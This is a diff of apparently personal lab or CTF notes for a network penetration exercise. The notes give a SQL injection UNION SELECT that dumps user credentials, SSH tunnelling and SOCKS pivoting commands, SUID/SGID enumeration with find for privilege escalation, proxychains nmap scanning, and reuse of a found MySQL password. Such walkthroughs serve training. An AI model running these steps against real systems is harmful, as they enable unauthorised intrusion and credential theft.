@@ -116,7 +116,7 @@ SQL
 - and we want to look at the 3 values being, user_id, name, and username
 - <URL>/pick.php?product=7 UNION SELECT user_id,name,username FROM siteusers.users
 - this gives us more creds in a table
-- 
+- outside of this sql there is not much else to do at all on this box
 
 siteusers 	id 	      $purchase_history
 siteusers 	quantity 	$purchase_history
@@ -129,6 +129,42 @@ siteusers 	date     	$shippingdates
 siteusers 	user_id 	$users
 siteusers 	name 	    $users
 siteusers 	username 	$users
+
+
+
+STEP 6
+- going to the next box
+- ssh -S /tmp/jmp jmp -O forward -L 33022:192.168.28.165:2222
+- ssh -MS /tmp/t3 user3@127.0.0.1 -p 33022
+- once youre in you can do a bash shell
+- you can now begin poking around and trying to enumerate
+- if we cant find anything we can look at our SUID and SGID
+- find / -type f -perm /4000 -ls 2>/dev/null    : find suid only files
+- find / -type f -perm /2000 -ls 2>/dev/null    : find sgid only files
+- find / -type f -perm /6000 -ls 2>/dev/null    : find suid and sgid files
+- once you find the vulnerable command which is find
+- go to gtfo bins and see what you can run with it to give you escalation
+- from here you can now ping sweep the system and see a new box
+- now with this you should make a new tunnel to be able to enumerate on this box 
+- close your other dynamic tunnel, ssh -S /tmp/jmp ANYTHING -O cancel -D 9050
+- ssh -S /tmp/t3 -O forward -D 9050
+- proxychains nmap 192.168.28.189
+- you can see from this that rdp is open
+- 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -249,3 +285,4 @@ Passwd.txt Passwds.txt passwd.txt password.txt passwords.txt
 
 On the occasion that in one of the .php files you find a mysql user and pass. You can use it and go into mariadb. In this case it was in login.php and looked like this. $con = mysqli_connect('localhost:3306','webuser','sqlpass','session')
 With this we can run a command from our shell to open mariadb mysql --user=webuser --pass=sqlpass
+keep in mind of the rsylog directories
